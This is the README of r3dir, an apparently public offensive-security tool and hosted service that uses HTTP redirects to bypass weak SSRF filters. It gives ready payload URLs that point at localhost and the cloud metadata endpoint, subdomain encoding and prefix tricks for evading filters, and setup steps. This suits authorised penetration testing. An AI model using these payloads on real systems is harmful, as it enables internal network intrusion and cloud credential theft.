# r3dir 
Target-dynamic redirection tool which helps bypass weak SSRF filters without redirection location validation. 

It provides easy to use HTTP redirection service which let user define redirection target via URL parameter or subdomains. Details about features of HTTP redirects in SSRF cases and how to utilize them via `r3dir` tool you can find in my article.

The service is currently run at the `r3dir.me` domain (and its subdomains) and supports both `HTTP` and `HTTPS` connections.

## Usage
The tool provides two approaches to define redirection targets: parameter and domain based.

Both approaches have an ability to control HTTP status code of a response via first subdomain of `r3dir.me` URL.

### Parameter-based redirection
If a vulnerable parameter allows you to set full URL with path and query parameters, you can use `url` parameter of `/--to/` path to specify a target. 

```bash
#Redirects to http://localhost with `307 Temporary Redirect` status code
https://307.r3dir.me/--to/?url=http://localhost 
```

### Domain-based redirection

Basically, you may control only host part of URL to successfully perform SSRF via HTTP redirection. While existing tools require manual configuration of the redirection target in such case, `r3dir` provides an ability to dynamically define the target via subdomains. 

![r3dir_decoding_flow_1](https://user-images.githubusercontent.com/62111809/221043190-632add79-52ef-4b74-87ce-df72bb5d76f2.png)

As you can see, subdomains contain splited Base32-encoded target, which is decoded by r3dir. The only limitation of the solution is maximum possible length of a domain, which equals to 253 characters.

```bash
#Redirects to http://169.254.169.254/latest/meta-data with `302 Found` status code
https://nb2hi4b2f4xtcnrzfyzdknboge3dslrsgu2c63dborsxg5bpnvsxiyjnmrqxiyi.302.r3dir.me 
```

Domain-based approach has `/--attach/` feature which allows to extend encoded target by adding path and query parameters to it.

```bash
#Redirects to http://localhost/path_to_add?param=value with `302 Found` status code
http://nb2hi4b2f4xwy33dmfwgq33toq.302.r3dir.me/--attach/path_to_add?param=value
```

To simplify domain-based approach usage, use CLI tool for encoding/decoding.

In addition, any subdomains before `--` subdomain is ignored. The feature let bypass some weak filters which checks substring presence in a domain and works for both approaches.

```bash
#Ignores `some.domain.to.ignore` part and redirects to http://169.254.169.254/latest/meta-data
https://some.domain.to.ignore.--.nb2hi4b2f4xtcnrzfyzdknboge3dslrsgu2c63dborsxg5bpnvsxiyjnmrqxiyi.302.r3dir.me

#Ignores `some.domain.to.ignore` part and edirects to http://localhost
https://some.domain.to.ignore.307.r3dir.me/--to/?url=http://localhost
```

### HTTPS limitations

Due to [limitations of wildcard TLS cerficates](https://en.wikipedia.org/wiki/Wildcard_certificate#Limitations) which do not work with multipule wildcard domains(like `*.*.301.r3dir.me`) HTTPS domain-based redirection works with targets that are not longer that 63 symbols(maximum length of one subdomain) in Base32-encoded form. In addition, `--ignore_part` feature also is not available due to the limit. 

## CLI tool

### Installation
```bash
git clone https://github.com/Horlad/r3dir.git
cd r3dir/app
python3 setup_cli.py install
```

#### Encode mode 
```bash
$ r3dir encode -h
  usage: r3dir encode [-h] [-c STATUS_CODE] [-d MAIN_DOMAIN] [-a] [-i IGNORE_PART | -s] target_url
  
  positional arguments:
    target_url            Target URL which r3dir tool should redirect to.
  
  options:
    -h, --help            show this help message and exit
    -c STATUS_CODE, --status_code STATUS_CODE
                          HTTP status code of a redirect response.
    -d MAIN_DOMAIN, --main_domain MAIN_DOMAIN
                          Domain where r3dir tool is hosted on.
    -a, --attach          generate with /--attach/ feature
    -i IGNORE_PART, --ignore_part IGNORE_PART
                          String, which will be ignored during decoding. Used to bypass weak REGEXs.
    -s, --https           HTTPS enforced encoding(TLS certificate length limitation)
```

#### Decode mode 
```bash
$ r3dir decode -h
  usage: r3dir decode [-h] [-d MAIN_DOMAIN] encoded_url
  
  positional arguments:
    encoded_url           r3dir encoded URL to decode

  options:
    -h, --help            show this help message and exit
    -d MAIN_DOMAIN, --main_domain MAIN_DOMAIN
                          Domain where r3dir tool is hosted on.
```


## HTTP server self-hosting

To spin up own instance, follow next steps:

1. Download the repository
```bash
git clone https://github.com/Horlad/r3dir.git
cd r3dir
```

Out-of-box setup with Let's Encrypt wildcard TLS certificates autorenewal (for HTTPS support) requires the service to be hosted on DigitalOcean droplet with [added domain](https://docs.digitalocean.com/products/networking/dns/quickstart/).

2. Fill environment file (`.env`) with your registered domain (`APP_DOMAIN`), DigitalOcean API token with `read` and `write` scopes (`DO_AUTH_TOKEN`) and email for  Let's Encrypt (`LETSENCRYPT_EMAIL`)
```bash
echo $'APP_DOMAIN=YOUR_DOMAIN\nDO_AUTH_TOKEN=DO_TOKEN\nLETSENCRYPT_EMAIL=YOUR@EMAIL.COM' > .env
```

3. Docker Compose startup (Traefik + HTTP server)
```bash
docker compose up -d
```

You can custom Traefik configuration for different environments(highly encourage to contribure solutions for another popular platforms).

In addition, if you want to use another HTTPS reverse proxy solution, you can run standalone Docker container with the HTTP service which is exposed on 80 port.

3. Standalone Docker container startup(HTTP server only)
```bash
docker build . -t r3dir
docker run -p 80:80 -e MAIN_DOMAIN=127.0.0.1.traefik.me r3dir
```
